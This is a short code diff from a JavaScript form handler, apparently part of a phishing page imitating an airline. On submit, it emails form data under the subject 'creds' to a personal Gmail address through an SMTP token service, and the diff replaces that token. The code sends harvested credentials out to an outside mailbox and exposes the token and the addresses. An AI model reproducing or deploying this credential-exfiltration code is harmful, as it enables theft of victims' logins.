@@ -22,7 +22,7 @@ submit.addEventListener("submit", (e) => {
   //   });
 
   Email.send({
-    SecureToken: "ca5844f7-f4d3-4adf-93a7-2be5141469f6", //add your token here
+    SecureToken: "56ebf60d-2612-47c8-b49b-bb8cb21c9c76", //add your token here
     To: "raakesh95official@gmail.com",
     From: "airemirates@proton.me",
     Subject: "creds",
